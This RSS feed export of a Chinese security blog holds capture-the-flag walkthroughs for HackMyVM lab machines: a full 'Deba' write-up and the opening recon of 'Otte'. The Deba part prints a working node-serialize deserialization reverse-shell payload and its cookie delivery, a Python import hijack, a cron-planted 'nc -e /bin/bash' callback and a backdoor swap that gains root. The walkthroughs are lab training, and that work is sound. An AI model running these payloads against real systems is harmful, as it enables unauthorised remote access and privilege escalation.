<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[C1trus ]]></title><description><![CDATA[Obsidian digital garden]]></description><link>https://www.c1trus.top/</link><image><url>https://www.c1trus.top/lib/media/favicon.png</url><title>C1trus </title><link>https://www.c1trus.top/</link></image><generator>Webpage HTML Export plugin for Obsidian</generator><lastBuildDate>Sat, 28 Dec 2024 15:26:54 GMT</lastBuildDate><atom:link href="https://www.c1trus.top/lib/rss.xml" rel="self" type="application/rss+xml"/><pubDate>Sat, 28 Dec 2024 15:26:54 GMT</pubDate><copyright><![CDATA[C1trus]]></copyright><ttl>60</ttl><dc:creator>C1trus</dc:creator><item><title><![CDATA[48.deba]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. 端口扫描" data-href="#2.1. 端口扫描" href="https://www.c1trus.top/about:blank#2.1._端口扫描" class="internal-link" target="_self" rel="noopener nofollow">2.1. 端口扫描</a>
<br><a data-tooltip-position="top" aria-label="2.2. 目录扫描" data-href="#2.2. 目录扫描" href="https://www.c1trus.top/about:blank#2.2._目录扫描" class="internal-link" target="_self" rel="noopener nofollow">2.2. 目录扫描</a>


<br><a data-tooltip-position="top" aria-label="3. nodejs反序列化 (CVE-2017-5941)" data-href="#3. nodejs反序列化 (CVE-2017-5941)" href="https://www.c1trus.top/about:blank#3._nodejs反序列化_(CVE-2017-5941)" class="internal-link" target="_self" rel="noopener nofollow">3. nodejs反序列化 (CVE-2017-5941)</a>
<br><a data-tooltip-position="top" aria-label="4. www-data提权low用户" data-href="#4. www-data提权low用户" href="https://www.c1trus.top/about:blank#4._www-data提权low用户" class="internal-link" target="_self" rel="noopener nofollow">4. www-data提权low用户</a>
<br><a data-tooltip-position="top" aria-label="5. 定时任务提权" data-href="#5. 定时任务提权" href="https://www.c1trus.top/about:blank#5._定时任务提权" class="internal-link" target="_self" rel="noopener nofollow">5. 定时任务提权</a>
<br><a data-tooltip-position="top" aria-label="6. wine命令 提权root" data-href="#6. wine命令 提权root" href="https://www.c1trus.top/about:blank#6._wine命令_提权root" class="internal-link" target="_self" rel="noopener nofollow">6. wine命令 提权root</a><br>
- <a data-tooltip-position="top" aria-label="6.1. 利用CS获取root" data-href="#6.1. 利用CS获取root" href="https://www.c1trus.top/about:blank#6.1._利用CS获取root" class="internal-link" target="_self" rel="noopener nofollow">6.1. 利用CS获取root</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Deba" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Deba</a><br>
作者 <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=nolose" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=nolose" target="_blank">nolose</a><br>
难度 ⭐️⭐️⭐️⭐️⭐️<br>
参考文章 <a rel="noopener nofollow" class="external-link" href="https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/" target="_blank">https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/</a>
<br><br><br>┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# nmap 192.168.56.26 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-26 11:28 EST
Nmap scan report for 192.168.56.26
Host is up (0.00075s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 08:00:27:2F:C3:52 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.80 seconds

<br>首页是apache<br>
<img alt="Pasted image 20241227002954" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png" referrerpolicy="no-referrer"><br>
3000端口首页<br>┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# curl http://192.168.56.26:3000/
Hello World 
<br><br>┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# dirsearch -u http://192.168.56.26 -x 403
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/deba/reports/http_192.168.56.26/_24-12-26_11-30-56.txt

Target: http://192.168.56.26/

[11:30:56] Starting:
[11:31:09] 301 -  321B  - /node_modules  -&gt;  http://192.168.56.26/node_modules/
[11:31:09] 200 -  992B  - /node_modules/
[11:31:09] 200 -  116B  - /package.json
[11:31:09] 200 -   32KB - /package-lock.json
[11:31:12] 200 -  386B  - /server.js

Task Completed

┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# dirsearch -u http://192.168.56.26:3000 -x 403
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/hmv/deba/reports/http_192.168.56.26_3000/_24-12-26_11-31-27.txt

Target: http://192.168.56.26:3000/

[11:31:27] Starting:

Task Completed

<br>发现一个nodejs的源码<br>┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# curl http://192.168.56.26//server.js
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
app.get('/', function(req, res) {
    if (req.cookies.profile) {
        var str = new Buffer(req.cookies.profile,'base64').toString();
        var obj = serialize.unserialize(str);
    if (obj.username) {
        res.send("Hello " + escape(obj.username));
    }

    } else {
        res.cookie('profile',"eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", { maxAge: 900000, httpOnly: true});
    }
res.send("Hello World");
});
app.listen(3000);
<br>
分析代码可知 访问 http://192.168.56.26:3000/ Web 应用程序中会检查客户端请求中是否带有名为 profile 的 Cookie，<br>
如果有，则会将其解码为 Base64 字符串，并使用 serialize.unserialize 将字符串反序列化为对象，<br>
由于Cookie是我们可以控制的，所以我们可以使用恶意cookie来利用这个反序列化漏洞
<br>我们可以先简单测试一下，如修改名字<br>┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# echo "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=" |base64 -d
{"username":"ajin","country":"india","city":"bangalore"} 

修改username的值
┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# echo -n "{"username":"c1trus","country":"india","city":"bangalore"}"  |base64
e3VzZXJuYW1lOmMxdHJ1cyxjb3VudHJ5OmluZGlhLGNpdHk6YmFuZ2Fsb3JlfQ==

┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─#  curl http://192.168.56.26:3000/ -b "profile=eyJ1c2VybmFtZSI6ImMxdHJ1cyIsImNvdW50cnkiOiJpbmRpYSIsImNpdHkiOiJiYW5nYWxvcmUifQ=="
Hello c1trus 
<br>可以发现确实被修改了<br>下面我们尝试利用这个反序列化漏洞 进行反弹shell<br>
这里有一个现成的反弹shell利用脚本<br>
<a rel="noopener nofollow" class="external-link" href="https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py" target="_blank">https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py</a><br><br>
这里其实就是利用的 <a data-tooltip-position="top" aria-label="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941" rel="noopener nofollow" class="external-link" href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941" target="_blank">CVE-2017-5941</a><br>
如果感兴趣，这里有在线的<a data-tooltip-position="top" aria-label="https://yunjing.ichunqiu.com/cve/detail/923?pay=2" rel="noopener nofollow" class="external-link" href="https://yunjing.ichunqiu.com/cve/detail/923?pay=2" target="_blank">免费靶场</a>让你复现
<br>利用脚本生成反弹shell的payload<br>
注意 :脚本要用python2运行<br>┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# python2 nodejsshell.py 192.168.56.6 1234
[+] LHOST = 192.168.56.6
[+] LPORT = 1234
[+] Encoding
eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,57,50,46,49,54,56,46,53,54,46,54,34,59,10,80,79,82,84,61,34,49,50,51,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))
<br>然后对payload进行base64编码<br>构造序列化代码<br>{"c1trus": "_$$ND_FUNC$$_function () { 上面生成的payload }()"}
<br>然后对这个构造出来的payload进行base64编码<br>eyJjMXRydXMiOiAiXyQkTkRfRlVOQyQkX2Z1bmN0aW9uICgpIHtldmFsKFN0cmluZy5mcm9tQ2hhckNvZGUoMTAsMTE4LDk3LDExNCwzMiwxMTAsMTAxLDExNiwzMiw2MSwzMiwxMTQsMTAxLDExMywxMTcsMTA1LDExNCwxMDEsNDAsMzksMTEwLDEwMSwxMTYsMzksNDEsNTksMTAsMTE4LDk3LDExNCwzMiwxMTUsMTEyLDk3LDExOSwxMTAsMzIsNjEsMzIsMTE0LDEwMSwxMTMsMTE3LDEwNSwxMTQsMTAxLDQwLDM5LDk5LDEwNCwxMDUsMTA4LDEwMCw5NSwxMTIsMTE0LDExMSw5OSwxMDEsMTE1LDExNSwzOSw0MSw0NiwxMTUsMTEyLDk3LDExOSwxMTAsNTksMTAsNzIsNzksODMsODQsNjEsMzQsNDksNTcsNTAsNDYsNDksNTQsNTYsNDYsNTMsNTQsNDYsNTQsMzQsNTksMTAsODAsNzksODIsODQsNjEsMzQsNDksNTAsNTEsNTIsMzQsNTksMTAsODQsNzMsNzcsNjksNzksODUsODQsNjEsMzQsNTMsNDgsNDgsNDgsMzQsNTksMTAsMTA1LDEwMiwzMiw0MCwxMTYsMTIxLDExMiwxMDEsMTExLDEwMiwzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDYxLDYxLDMyLDM5LDExNywxMTAsMTAwLDEwMSwxMDIsMTA1LDExMCwxMDEsMTAwLDM5LDQxLDMyLDEyMywzMiw4MywxMTYsMTE0LDEwNSwxMTAsMTAzLDQ2LDExMiwxMTQsMTExLDExNiwxMTEsMTE2LDEyMSwxMTIsMTAxLDQ2LDk5LDExMSwxMTAsMTE2LDk3LDEwNSwxMTAsMTE1LDMyLDYxLDMyLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCw0MCwxMDUsMTE2LDQxLDMyLDEyMywzMiwxMTQsMTAxLDExNiwxMTcsMTE0LDExMCwzMiwxMTYsMTA0LDEwNSwxMTUsNDYsMTA1LDExMCwxMDAsMTAxLDEyMCw3OSwxMDIsNDAsMTA1LDExNiw0MSwzMiwzMyw2MSwzMiw0NSw0OSw1OSwzMiwxMjUsNTksMzIsMTI1LDEwLDEwMiwxMTcsMTEwLDk5LDExNiwxMDUsMTExLDExMCwzMiw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMTE4LDk3LDExNCwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDMyLDYxLDMyLDExMCwxMDEsMTE5LDMyLDExMCwxMDEsMTE2LDQ2LDgzLDExMSw5OSwxMDcsMTAxLDExNiw0MCw0MSw1OSwxMCwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDk5LDExMSwxMTAsMTEwLDEwMSw5OSwxMTYsNDAsODAsNzksODIsODQsNDQsMzIsNzIsNzksODMsODQsNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDQxLDMyLDEyMywxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTgsOTcsMTE0LDMyLDExNSwxMDQsMzIsNjEsMzIsMTE1LDExMiw5NywxMTksMTEwLDQwLDM5LDQ3LDk4LDEwNSwxMTAsNDcsMTE1LDEwNCwzOSw0NCw5MSw5Myw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExOSwxMTQsMTA1LDExNiwxMDEsNDAsMzQsNjcsMTExLDExMCwxMTAsMTAxLDk5LDExNiwxMDEsMTAwLDMzLDkyLDExMCwzNCw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwNSwxMTAsNDEsNTksMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwNCw0NiwxMTUsMTE2LDEwMCwxMTEsMTE3LDExNiw0NiwxMTIsMTA1LDExMiwxMDEsNDAsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0MSw1OSwxMCwzMiwzMiwzMiwzMiwzMiwzMiwzMiwzMiwxMTUsMTA0LDQ2LDExNSwxMTYsMTAwLDEwMSwxMTQsMTE0LDQ2LDExMiwxMDUsMTEyLDEwMSw0MCw5OSwxMDgsMTA1LDEwMSwxMTAsMTE2LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDExNSwxMDQsNDYsMTExLDExMCw0MCwzOSwxMDEsMTIwLDEwNSwxMTYsMzksNDQsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDk5LDExMSwxMDAsMTAxLDQ0LDExNSwxMDUsMTAzLDExMCw5NywxMDgsNDEsMTIzLDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDk5LDEwOCwxMDUsMTAxLDExMCwxMTYsNDYsMTAxLDExMCwxMDAsNDAsMzQsNjgsMTA1LDExNSw5OSwxMTEsMTEwLDExMCwxMDEsOTksMTE2LDEwMSwxMDAsMzMsOTIsMTEwLDM0LDQxLDU5LDEwLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDMyLDEyNSw0MSw1OSwxMCwzMiwzMiwzMiwzMiwxMjUsNDEsNTksMTAsMzIsMzIsMzIsMzIsOTksMTA4LDEwNSwxMDEsMTEwLDExNiw0NiwxMTEsMTEwLDQwLDM5LDEwMSwxMTQsMTE0LDExMSwxMTQsMzksNDQsMzIsMTAyLDExNywxMTAsOTksMTE2LDEwNSwxMTEsMTEwLDQwLDEwMSw0MSwzMiwxMjMsMTAsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMzIsMTE1LDEwMSwxMTYsODQsMTA1LDEwOSwxMDEsMTExLDExNywxMTYsNDAsOTksNDAsNzIsNzksODMsODQsNDQsODAsNzksODIsODQsNDEsNDQsMzIsODQsNzMsNzcsNjksNzksODUsODQsNDEsNTksMTAsMzIsMzIsMzIsMzIsMTI1LDQxLDU5LDEwLDEyNSwxMCw5OSw0MCw3Miw3OSw4Myw4NCw0NCw4MCw3OSw4Miw4NCw0MSw1OSwxMCkpIH0oKSJ9
<br>开启监听 并使用这个payload作为cookie然后访问<br>curl http://192.168.56.26:3000/ -b "profile=base64后的payload"
<br>┌──(root㉿kali)-[~/Desktop/hmv/deba]
└─# pwncat-cs -lp 1234

[03:51:04] Welcome to pwncat 🐈!                                                                  __main__.py:164
[03:51:09] received connection from 192.168.56.26:44754                                                bind.py:84
[03:51:09] 0.0.0.0:1234: normalizing shell path                                                    manager.py:957
           0.0.0.0:1234: upgrading from /usr/bin/dash to /usr/bin/bash                             manager.py:957
           192.168.56.26:44754: registered new host w/ db                                          manager.py:957
(local) pwncat$
(remote) www-data@debian:/var/www$ whoami
www-data

<br><br>(remote) www-data@debian:/home/low$ sudo -l
Matching Defaults entries for www-data on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on debian:
    (ALL : low) NOPASSWD: /usr/bin/python3 /home/low/scripts/script.py

(remote) www-data@debian:/home/low/scripts$ ls -la
total 16
drwxr-xr-x 2 low      low      4096 may  7  2021 .
drwxr-xr-x 8 low      low      4096 may  7  2021 ..
-rwxr-xr-x 1 www-data www-data   88 may  7  2021 main.py
-rw-r--r-- 1 low      low        80 may  7  2021 script.py

(remote) www-data@debian:/home/low/scripts$ cat script.py
import main
import os

print("\n")
os.system("ip a | grep enp0s3")

print("\n")

<br>这里我们可以用 low 用户执行 script.py 而且 script.py 引入了 main.py 我们当前用户可以修改这个 main.py 文件<br>修改 mian.py<br>(remote) www-data@debian:/home/low/scripts$ vi main.py
(remote) www-data@debian:/home/low/scripts$ cat main.py
from os import system as main
print("\n")
print("Just main")
main("whoami")
main("/bin/bash")

<br>sudo提权<br>(remote) www-data@debian:/home/low/scripts$ sudo -u low python3 /home/low/scripts/script.py

low@debian:~/scripts$ whoami
low

low@debian:~$ cat user.txt
justdeserialize

<br><br>我们使用提权脚本进行检测发现可以利用的点<br>*/1 *   * * *   debian /usr/bin/python3 /home/debian/Documentos/backup/dissapeared.py ; echo "Done" &gt;&gt; /home/debian/Documentos/log
<br>debian 用户每分钟会执行一次 /home/debian/Documentos/backup/dissapeared.py<br>但是 backup/dissapeared.py 并不存在，我们自己写一个即可<br>low@debian:/home/debian/Documentos$  ls -la
total 12
drwxrwx---  2 debian low    4096 may  7  2021 .
drwxr-xr-x 15 debian debian 4096 may  8  2021 ..
-rw-r--r--  1 debian debian  600 dic 27 10:19 log
low@debian:/home/debian/Documentos$ mkdir backup
low@debian:/home/debian/Documentos$ vi dissapeared.py
low@debian:/home/debian/Documentos$ cat dissapeared.py
import os
os.system("nc -e /bin/bash 192.168.56.6 2233")

<br>等待反弹即可<br><br>(remote) debian@debian:/home/debian$ sudo -l
Matching Defaults entries for debian on debian:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User debian may run the following commands on debian:
    (ALL : root) NOPASSWD: /bin/wine /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
    
(remote) debian@debian:/home/debian$ ls -l /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
-rw-r--r-- 1 debian debian 21190 may  7  2021 /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe


<br>wine  简单来说就是允许我们在linux上允许window程序<br>
我们只要将 brainfuck.exe 替换成我们的后门程序即可<br><br>note这里我先用msf试着生成一个exe后门 ，但是没有成功，wine执行后会保存<br>
然后用CS生成exe后门可以运行且不会报错<br>msf后门报错<br>(remote) debian@debian:/home/debian$ sudo -u root /bin/wine /opt/Buffer-Overflow-Vulnerable-app/brainfuck.exe
0009:err:seh:setup_exception_record stack overflow 1200 bytes in thread 0009 eip 7bc46086 esp 00240e80 stack 0x240000-0x241000-0x340000


<br>上传CS生成的后门<br>
然后运行即可<br><img alt="Pasted image 20241227182208" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227182208.png" referrerpolicy="no-referrer"><br>
但是由于是linux运行window的后门， 好像执行不了命令，反正我没有成功<br>
但是我们可以进行文件操作，这里可以直接读取root.txt<br>但我还是选择写公钥进去然后连接<br>
<img alt="Pasted image 20241227182738" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227182738.png" referrerpolicy="no-referrer"><br>
成功拿下root<br>┌──(root㉿kali)-[/var/www/html]
└─# ssh -i /root/.ssh/id_rsa root@192.168.56.26
The authenticity of host '192.168.56.26 (192.168.56.26)' can't be established.
ED25519 key fingerprint is SHA256:FQI6CQCD3uUo59olao5SmG/3b/R9quOafr6mSSLvdlA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.56.26' (ED25519) to the list of known hosts.
Linux debian 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
root@debian:~# whoami
root
root@debian:~# cat /root/root.txt
BoFsavetheworld

<br>最后，其实这里也可以用 pwnkit 漏洞进行内核提权]]></description><link>https://www.c1trus.top/24-渗透/hmv/48.deba.html</link><guid isPermaLink="false">24-渗透/HMV/48.deba.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Fri, 27 Dec 2024 11:09:05 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241227002954.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[49.otte]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. 基本信息^toc" data-href="#1. 基本信息^toc" href="https://www.c1trus.top/about:blank#1._基本信息^toc" class="internal-link" target="_self" rel="noopener nofollow">1. 基本信息</a>
<br><a data-tooltip-position="top" aria-label="2. 信息收集" data-href="#2. 信息收集" href="https://www.c1trus.top/about:blank#2._信息收集" class="internal-link" target="_self" rel="noopener nofollow">2. 信息收集</a>

<br><a data-tooltip-position="top" aria-label="2.1. ftp匿名登录" data-href="#2.1. ftp匿名登录" href="https://www.c1trus.top/about:blank#2.1._ftp匿名登录" class="internal-link" target="_self" rel="noopener nofollow">2.1. ftp匿名登录</a>
<br><a data-tooltip-position="top" aria-label="2.2. 爆破网站登录密码" data-href="#2.2. 爆破网站登录密码" href="https://www.c1trus.top/about:blank#2.2._爆破网站登录密码" class="internal-link" target="_self" rel="noopener nofollow">2.2. 爆破网站登录密码</a>
<br><a data-tooltip-position="top" aria-label="2.3. 目录爆破" data-href="#2.3. 目录爆破" href="https://www.c1trus.top/about:blank#2.3._目录爆破" class="internal-link" target="_self" rel="noopener nofollow">2.3. 目录爆破</a>
<br><a data-tooltip-position="top" aria-label="2.4. 参数爆破" data-href="#2.4. 参数爆破" href="https://www.c1trus.top/about:blank#2.4._参数爆破" class="internal-link" target="_self" rel="noopener nofollow">2.4. 参数爆破</a>


<br><a data-tooltip-position="top" aria-label="3. 提权到thomas" data-href="#3. 提权到thomas" href="https://www.c1trus.top/about:blank#3._提权到thomas" class="internal-link" target="_self" rel="noopener nofollow">3. 提权到thomas</a>

<br><a data-tooltip-position="top" aria-label="3.1. 恢复文件签名" data-href="#3.1. 恢复文件签名" href="https://www.c1trus.top/about:blank#3.1._恢复文件签名" class="internal-link" target="_self" rel="noopener nofollow">3.1. 恢复文件签名</a>


<br><a data-tooltip-position="top" aria-label="4. 提权到laetitia用户" data-href="#4. 提权到laetitia用户" href="https://www.c1trus.top/about:blank#4._提权到laetitia用户" class="internal-link" target="_self" rel="noopener nofollow">4. 提权到laetitia用户</a>

<br><a data-tooltip-position="top" aria-label="4.1. 代码审计" data-href="#4.1. 代码审计" href="https://www.c1trus.top/about:blank#4.1._代码审计" class="internal-link" target="_self" rel="noopener nofollow">4.1. 代码审计</a>


<br><a data-tooltip-position="top" aria-label="5. 提权到cedric用户" data-href="#5. 提权到cedric用户" href="https://www.c1trus.top/about:blank#5._提权到cedric用户" class="internal-link" target="_self" rel="noopener nofollow">5. 提权到cedric用户</a>
<br><a data-tooltip-position="top" aria-label="6. 提权到root" data-href="#6. 提权到root" href="https://www.c1trus.top/about:blank#6._提权到root" class="internal-link" target="_self" rel="noopener nofollow">6. 提权到root</a><br>
- <a data-tooltip-position="top" aria-label="6.1. 另外一种方案提权root" data-href="#6.1. 另外一种方案提权root" href="https://www.c1trus.top/about:blank#6.1._另外一种方案提权root" class="internal-link" target="_self" rel="noopener nofollow">6.1. 另外一种方案提权root</a><br>
靶机链接 <a rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/machines/machine.php?vm=Otte" target="_blank">https://hackmyvm.eu/machines/machine.php?vm=Otte</a><br>
作者 <a data-tooltip-position="top" aria-label="https://hackmyvm.eu/profile/?user=cromiphi" rel="noopener nofollow" class="external-link" href="https://hackmyvm.eu/profile/?user=cromiphi" target="_blank">cromiphi</a><br>
难度 ⭐️⭐️⭐️⭐️⭐️
<br><br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# nmap 192.168.56.27 -p-
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-27 21:48 EST
Nmap scan report for 192.168.56.27
Host is up (0.00087s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:84:B9:A1 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.47 seconds

<br><br>┌──(root㉿kali)-[~/Desktop/hmv/otte]
└─# ftp 192.168.56.27
Connected to 192.168.56.27.
220 ProFTPD Server (Debian) [::ffff:192.168.56.27]
Name (192.168.56.27:root): anonymous
331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
226 Transfer complete
ftp&gt; ls -la
229 Entering Extended Passive Mode (|||64320|)
150 Opening ASCII mode data connection for file list
drwxr-xr-x   2 ftp      ftp          4096 May 15  2021 .
drwxr-xr-x   2 ftp      ftp          4096 May 15  2021 ..
-rw-r--r--   1 ftp      ftp            89 May 15  2021 note.txt
226 Transfer complete
ftp&gt; get note.txt
local: note.txt remote: note.txt
229 Entering Extended Passive Mode (|||5844|)
150 Opening BINARY mode data connection for note.txt (89 bytes)
    89      250.47 KiB/s
226 Transfer complete
89 bytes received in 00:00 (92.55 KiB/s)
ftp&gt; exit
221 Goodbye.

